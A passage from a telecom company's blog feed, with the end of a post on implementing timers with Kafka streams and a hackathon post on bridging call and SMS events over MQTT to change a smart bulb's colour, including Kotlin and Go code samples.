style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">timeoutEvents.process(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ProcessorSupplier {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            object : Processor&lt;String, Future&gt; {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                override fun init(context: ProcessorContext) {}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                override fun process(key: String, value: Future) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    KafkaProducers.send(Topic.valueOf(value.callBackTopic),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            value.callBackKey,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            value.callBack.toByteArray()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Metrics.timerFired(value.callBackTopic)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                override fun close() {}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="cancelling-a-timer">Cancelling a timer<a class="hash-link" href="#cancelling-a-timer" title="Direct link to heading">​</a></h3><p>There is no way to cancel these timers as events can't be easily removed from the Kafka stream.
Still, it is possible to ignore timer events by using a token in callback request, and a variable
in timer receiver state. When scheduling a timer the receiver puts the same token in two places:</p><ul><li>callback struct it publishes on the <em>timer-request</em> topic</li><li>internal variable timerToken</li></ul><p>As timer fires receiver compares value in timerToken and in the callback event. Based on the result it
draws a conclusion if timer is to be ignored or not. All it has to do to cancel a timer is to reset
value in its timerToken variable.</p><p>Since normally Kafka does "at least once" delivery it is a good idea to reset the timerToken immediately
after notification event.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="what-to-worry-about">What to worry about<a class="hash-link" href="#what-to-worry-about" title="Direct link to heading">​</a></h3><p>Kafka streams library is using local disk storage to keep the cache. The storage shall be large enough to host
all timer requests based on the product of <em>timer-request</em> topic retention, callback size and timer scheduling rate.
Thankfully Kafka is well-equipped to deal with this sort of troubles.</p><p>Oscillator must keep ticking otherwise timers will stop coming. Make sure to have
metrics/alarms in place to stay on top of Oscillator health. Deploy few of them for redundancy having in
mind the extra load they will generate on timer users.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>There are many options to export application state to the data tier layer. Timers are often part of that
state. Above we showed how to apply Kafka primitives to achieve a goal of making application "stateless" even
if the state is using timers. It has its costs and benefits.</p><p>Check out openings on the <a href="https://wgtwo.com/career" target="_blank" rel="noopener noreferrer">Careers page</a> if you’re interested in building the future Telco backbone.</p>]]></content>
        <author>
            <name>Sergey Zyrianov</name>
            <uri>https://www.linkedin.com/in/sergey-zyrianov-8a7ab34/</uri>
        </author>
        <category label="kafka" term="kafka"/>
        <category label="timer" term="timer"/>
        <category label="stateless" term="stateless"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Changing the color of your bulbs: The fancy way]]></title>
        <id>mqtt-event-bridge</id>
        <link href="https://www.wgtwo.com/blog/mqtt-event-bridge"/>
        <updated>2021-01-07T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[last hackathon i did setup a mqtt integration towards wgtwo's apis to enable call notifications via my ikea trådfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.]]></summary>
        <content type="html"><![CDATA[<p>last hackathon i did setup a mqtt integration towards <strong>wgtwo</strong>'s apis to enable call notifications via my ikea trådfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.</p><p><img src="/assets/images/animation-0c11cc8b3879ebb39b1d24e3a5064e2c.webp" width="600" height="450"></p><hr><p>There are a variety of events generated by <strong>wgtwo</strong>’s systems for subscriptions on the platform. This includes information such as call events, SMS sent to and from a subscription (including content), voicemail events, location events, and more.</p><p>We offer a <a href="https://docs.wgtwo.com/events/listen-for-events/" target="_blank" rel="noopener noreferrer">gRPC API</a> which enables developers to listen to a selection of these events.</p><p>I wanted to make a super simple setup so that I could configure home automation rules, e.g. <strong>"If someone calls me, make my IKEA bulb change color to notify me"</strong> or <strong>"If I send myself a SMS with 'Leaf ON', turn on the heater in my car"</strong>.</p><p>A lot of home automation tools, such as Node-RED and Home Assistant have great MQTT support, so instead of writing a native gRPC integration I wanted to make a more flexible solution by offering these events over MQTT. This way, anyone using a home automation tool with MQTT support can integrate with our platform easily.</p><p>During our last hackathon I built a simple bridge between our events API and MQTT. I wrote this bridge in Go, using <a href="https://github.com/mochi-co/mqtt" target="_blank" rel="noopener noreferrer">Mochi MQTT</a> as an embedded MQTT server.</p><p>The flow is shown in this sketch:
<img src="/assets/images/sketch-8ae1c400a05f7ec61c39047a01f21288.svg" width="2567" height="765"></p><p>The way it works is quite simple: You log in to the service using our OAuth solution. You then grant the service access to fetch events on your behalf. The service will then generate a username and password for you.</p><p>The service will fetch events for all subscribers that have enabled it and publish these to the MQTT server with topic <code>{phone number}/events/{type}</code>. With the generated credentials, you may then subscribe to these events.</p><p>Note that nothing of this requires any setup on your phone, so it would work equally well on a 20-30 year old Nokia phone.</p><p>As I'll explain in more detail below, I did setup a quick Node-RED flow to consume these events as shown in the video below:</p><h1><a target="_blank" href="/assets/files/calling-c705f71e862ebe9c9611db0cf4d5244e.mp4/">video</a></h1><p>Here you can see that:</p><ol><li>The light changes to cool white when the call is initiated (phone not yet ringing)</li><li>It turns pink when the phone is ringing</li><li>It turns red when we pick up the call</li><li>It returns to normal after the call has ended</li></ol><h2 class="anchor anchorWithStickyNavbar_mojV" id="connecting-to-wgtwos-api">Connecting to <strong>wgtwo</strong>'s API<a class="hash-link" href="#connecting-to-wgtwos-api" title="Direct link to heading">​</a></h2><p>We will use a normal OAuth2 authorization code grant for logging in to our service.</p><p>To handle this, we used the module <code>github.com/markbates/goth</code> with the following settings:</p><div class="codeBlockContainer_I0IT language-go theme-code-block"><div class="codeBlockContent_wNvx go"><pre tabindex="0" class="prism-code language-go codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"golang.org/x/oauth2"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">const</span><span class="token plain"> endpointProfile </span><span class="token builtin" style="color:rgb(130, 170, 255)">string</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"https://id.wgtwo.com/userinfo"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">var</span><span class="token plain"> Endpoint </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> oauth2</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">Endpoint</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  AuthURL</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">  </span><span class="token string" style="color:rgb(195, 232, 141)">"https://id.wgtwo.com/oauth2/auth"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  TokenURL</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"https://id.wgtwo.com/oauth2/token"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>When logging in, the user will be asked to consent to the following scopes:</p><ul><li>phone: Allowing the service to fetch the user’s phone number</li><li>offline_access: Giving the service a refresh token</li><li>events.voice.subscribe: Allow the service to see all call events</li><li>events.voicemail.subscribe: Allow the service to see if a voicemail has been left</li><li>events.sms.subscribe: Allow the service to get a copy of every SMS sent and received</li></ul><p>All the events you have consented to share with the service will be stored in the service's queue.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">sms events        ─╮</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">voice events      ─┼─▷  queue  ◁── gRPC API</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">voice mail events ─╯</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This queue can be consumed by using the events streaming API (<a href="https://docs.wgtwo.com/events/listen-for-events/" target="_blank" rel="noopener noreferrer">docs</a>), which requires the service to use the OAuth2 client credentials grant flow.</p><p>Events will be shared with the service as long as there exists an active consent.</p><p>We then initiate the server side stream to fetch the events:</p><div class="codeBlockContainer_I0IT language-go theme-code-block"><div class="codeBlockContent_wNvx go"><pre tabindex="0" class="prism-code language-go codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">request </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">&amp;</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SubscribeEventsRequest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  Type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">          </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">EventType</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">EventType_VOICEMAIL_EVENT</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  StartPosition</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">&amp;</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SubscribeEventsRequest_StartAtOldestPossible</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ClientId</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">      uuid</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">New</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">String</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  QueueName</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">     </span><span class="token string" style="color:rgb(195, 232, 141)">"wgtwo-mqtt-demo"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  DurableName</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">   </span><span class="token string" style="color:rgb(195, 232, 141)">"wgtwo-mqtt-demo"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  MaxInFlight</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">   </span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ManualAck</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">&amp;</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">ManualAckConfig</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     Enable</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">  </span><span class="token boolean" style="color:rgb(255, 88, 116)">true</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     Timeout</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> ptypes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">DurationProto</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">*</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">Second</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">r</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">Subscribe</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">TODO</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> request</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">for</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  response</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">Recv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">if</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">==</span><span class="token plain"> io</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">EOF </span><span class="token operator" style="color:rgb(137, 221, 255)">||</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">!=</span><span class="token plain"> </span><span class="token boolean" style="color:rgb(255, 88, 116)">nil</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     </span><span class="token keyword" style="font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  event </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> response</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">Event</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">// PUBLISH EVENT TO MQTT SERVER ON TOPIC {event owner}/events/{type}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="connecting-to-our-new-mqtt-service">Connecting to our new MQTT service<a class="hash-link" href="#connecting-to-our-new-mqtt-service" title="Direct link to heading">​</a></h2><p>The service has a very pretty landing page (Disclaimer: I am not a designer).</p><p><img alt="landing page" src="data:image/png;base64,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